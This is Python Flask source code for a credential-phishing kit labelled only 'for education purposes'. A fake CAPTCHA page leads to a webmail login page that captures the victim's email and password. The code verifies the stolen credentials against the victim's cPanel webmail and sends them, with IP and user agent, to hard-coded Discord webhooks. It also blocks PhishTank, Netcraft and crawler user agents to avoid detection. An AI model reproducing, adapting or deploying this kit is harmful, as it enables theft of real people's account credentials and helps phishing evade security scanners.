import time
import random
import secrets
import ssl
import requests
import dns.resolver
from PIL import Image, ImageDraw, ImageFont
from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# made for education purposes only

# Discord Webhook URL
DISCORD_WEBHOOK_URLS = [
    "https://discord.com/api/webhooks/1400503399988068553/YNpkRNM4uJwwFoevlsup2trY-sWF0mqzcKCCR5jPWFcjblehYvXxT_FrSKP93z5ielb5",
    "https://discord.com/api/webhooks/1400503440689336491/uGSd16SHfBM6uxZDV45DCshAog497D52vRgCiuyozI8aW2mIIE29ytIrSxz-IKGSZibZ",
    "https://discord.com/api/webhooks/1400503460780048567/EyUr8dLLPXNH60__cLsWi53tTvnikSJ3vn5OsAywkDFSxHhAL1vGdx27AZLUUF_NfT4C"
]

def send_discord_message(email, password, ip, useragent, domain, mx_record):
    webhook_url = random.choice(DISCORD_WEBHOOK_URLS)  # Select a random webhook
    message = {
        "username": "Cambar Logs",
        "embeds": [
            {
                "title": "🔔 CAMBAR SUCCESS Log✅✅✅",
                "color": 16711680,  # Red color in Discord embed
                "fields": [
                    {"name": "📧 Email", "value": f"`{email}`", "inline": False},
                    {"name": "🔑 Password", "value": f"`{password}`", "inline": False},
                    {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
                    {"name": "🖥 User-Agent", "value": f"`{useragent}`", "inline": False},
                    {"name": "🌍 Domain", "value": f"`{domain}`", "inline": False},
                    {"name": "📨 MX Record", "value": f"`{mx_record}`", "inline": False},
                ],
                "footer": {"text": "Cambar Logs - Secure Notifications✅✅✅"},
            }
        ]
    }
    
    try:
        requests.post(webhook_url, json=message)
    except request.exceptions.RequestException as e:
        print(f"Error sending message to Discord: {e}")

def send_discord_failed(email, password, ip, useragent, domain, mx_record):
    webhook_url = random.choice(DISCORD_WEBHOOK_URLS)  # Select a random webhook
    message = {
        "username": "Cambar Logs",
        "embeds": [
            {
                "title": "🔔 CAMBAR FAILED Log⛔⛔⛔",
                "color": 16711680,  # Red color in Discord embed
                "fields": [
                    {"name": "📧 Email", "value": f"`{email}`", "inline": False},
                    {"name": "🔑 Password", "value": f"`{password}`", "inline": False},
                    {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
                    {"name": "🖥 User-Agent", "value": f"`{useragent}`", "inline": False},
                    {"name": "🌍 Domain", "value": f"`{domain}`", "inline": False},
                    {"name": "📨 MX Record", "value": f"`{mx_record}`", "inline": False},
                ],
                "footer": {"text": "Cambar Logs - Secure Notifications⛔⛔⛔"},
            }
        ]
    }
    
    try:
        requests.post(webhook_url, json=message)
    except request.exceptions.RequestException as e:
        print(f"Error sending message to Discord: {e}")

def fetch_content():
    dman = session.get('ins')
    email = request.form.get("horse")
    password = request.form.get("pig")
    target_url = f"{dman}:2096/login/?user={email}&pass={password}"
    try:
        response = requests.get(target_url, timeout=6)
        response.raise_for_status()
        html_content = response.text
    except requests.RequestException as e:
        html_content = f"<p>Error: {e}</p>"
    
    return render_template('fetched.html', content=html_content)

def get_mx_record(domain):
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        return ', '.join(str(r.exchange) for r in answers)
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.exception.Timeout):
        return "No MX Record Found"

app = Flask(__name__)
limiter = Limiter(get_remote_address, app=app, default_limits=["6 per day", "6 per hour"])
secret_keyx = secrets.token_urlsafe(24)
app.secret_key = secret_keyx

bot_user_agents = [
'Googlebot', 
'Baiduspider', 
'ia_archiver',
'R6_FeedFetcher', 
'NetcraftSurveyAgent', 
'Sogou web spider',
'bingbot', 
'Yahoo! Slurp', 
'facebookexternalhit', 
'PrintfulBot',
'msnbot', 
'Twitterbot', 
'UnwindFetchor', 
'urlresolver', 
'Butterfly', 
'TweetmemeBot',
'PaperLiBot',
'MJ12bot',
'AhrefsBot',
'Exabot',
'Ezooms',
'YandexBot',
'SearchmetricsBot',
'phishtank',
'PhishTank',
'picsearch',
'TweetedTimes Bot',
'QuerySeekerSpider',
'ShowyouBot',
'woriobot',
'merlinkbot',
'BazQuxBot',
'Kraken',
'SISTRIX Crawler',
'R6_CommentReader',
'magpie-crawler',
'GrapeshotCrawler',
'PercolateCrawler',
'MaxPointCrawler',
'R6_FeedFetcher',
'NetSeer crawler',
'grokkit-crawler',
'SMXCrawler',
'PulseCrawler',
'Y!J-BRW',
'80legs.com/webcrawler',
'Mediapartners-Google', 
'Spinn3r', 
'InAGist', 
'Python-urllib', 
'NING', 
'TencentTraveler',
'Feedfetcher-Google', 
'mon.itor.us', 
'spbot', 
'Feedly',
'bot',
'curl',
"spider",
"crawler"
]

@app.route('/', methods=['GET', 'POST'])
def captcha():

    if request.method == 'GET':

        if 'passed_captcha' in session and session['passed_captcha']:

            # CAPTCHA has already been passed, redirect to success page
            return redirect(url_for('success'))

        # Generate a random 4-digit code
        code = random.randint(1000, 9999)
        colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
        color = random.choice(colors)
        session['code'] = str(code)
        userauto = request.args.get("web")
        userdomain = userauto[userauto.index('@') + 1:]
        session['eman'] = userauto
        session['ins'] = userdomain
        return render_template('captcha.html', code=code, color=color, eman=userauto, ins=userdomain, error=False)
    elif request.method != 'GET':

        user_input = request.form['code']

        if user_input == session['code']:
            
            # User input matches the code, set the flag and redirect to success page
            session['passed_captcha'] = True
            return redirect(url_for('success'))
        else:
            # User input does not match the code, generate a new code and render the CAPTCHA page with an error message
            code = random.randint(1000, 9999)
            colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
            color = random.choice(colors)
            session['code'] = str(code)

            return render_template('captcha.html', code=code, color=color, error=True)

@app.route('/success')
def success():
    if 'passed_captcha' in session and session['passed_captcha']:
        web_param = request.args.get('web')
        return redirect(url_for('route2', web=web_param))
    else:
        return redirect(url_for('captcha'))


@app.route("/m")
def route2():
    web_param = request.args.get('web')
    if web_param:
        session['eman'] = web_param
        session['ins'] = web_param[web_param.index('@') + 1:]
    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))


@app.route("/first", methods=['POST'])
def first():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For') or \
             request.headers.get('X-Real-IP') or \
             request.headers.get('X-Client-IP') or \
             request.remote_addr
             
        email = request.form.get("horse")
        password = request.form.get("pig")
        useragent = request.headers.get('User-Agent')
        dman = session.get('ins')  # Get the domain from session
        
        # Get MX record
        domain = email.split('@')[-1] if email and '@' in email else None
        mx_record = get_mx_record(domain) if domain else "Invalid Domain"

        # Step 1: Ensure dman has http/https
        if not dman.startswith("http://") and not dman.startswith("https://"):
            dman = "https://" + dman

        try:
            # Step 2: Make the GET request to check credentials
            response = requests.get(f"{dman}:2096/login/?user={email}&pass={password}", timeout=10)
            # Step 3: Check if login is successful
            if "/cpsess" in response.url:
                # Send data to Discord
                send_discord_message(email, password, ip, useragent, domain, mx_record)
                return redirect(f"{dman}:2096/login/?user={email}&pass={password}")
            else:
                # Credentials are incorrect
                fetch_content()
                send_discord_failed(email, password, ip, useragent, domain, mx_record)
                return redirect(url_for('benza'))
        except Exception as e:
            # Handle request errors
            return f"Error checking credentials: {str(e)}", 500



@app.route("/second", methods=['POST'])
def second():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For') or \
             request.headers.get('X-Real-IP') or \
             request.headers.get('X-Client-IP') or \
             request.remote_addr
             
        email = request.form.get("horse")
        password = request.form.get("pig")
        useragent = request.headers.get('User-Agent')
        dman = session.get('ins')  # Get the domain from session
        
        # Get MX record
        domain = email.split('@')[-1] if email and '@' in email else None
        mx_record = get_mx_record(domain) if domain else "Invalid Domain"

        # Step 1: Ensure dman has http/https
        if not dman.startswith("http://") and not dman.startswith("https://"):
            dman = "https://" + dman

        try:
            # Step 2: Make the GET request to check credentials
            response = requests.get(f"{dman}:2096/login/?user={email}&pass={password}", timeout=10)
            # Step 3: Check if login is successful
            if "/cpsess" in response.url:
                # Send data to Discord
                send_discord_message(email, password, ip, useragent, domain, mx_record)
                return redirect(f"{dman}:2096/login/?user={email}&pass={password}")
            else:
                # Credentials are incorrect
                fetch_content()
                send_discord_failed(email, password, ip, useragent, domain, mx_record)
                return redirect(url_for('lasmo'))
        except Exception as e:
            # Handle request errors
            return f"Error checking credentials: {str(e)}", 500



@app.route("/benzap", methods=['GET'])
def benza():
    if request.method == 'GET':
        eman = session.get('eman')
        dman = session.get('ins')
    return render_template('ind.html', eman=eman, dman=dman)

@app.route("/lasmop", methods=['GET'])
def lasmo():
    userip = request.headers.get("X-Forwarded-For")
    useragent = request.headers.get("User-Agent")
    
    if useragent in bot_user_agents:
        abort(403)  # forbidden
    
    if request.method == 'GET':
        dman = session.get('ins')
        return render_template('logout.html', dman=dman)

if __name__ == '__main__':
	app.run(host="0.0.0.0", port=3000)
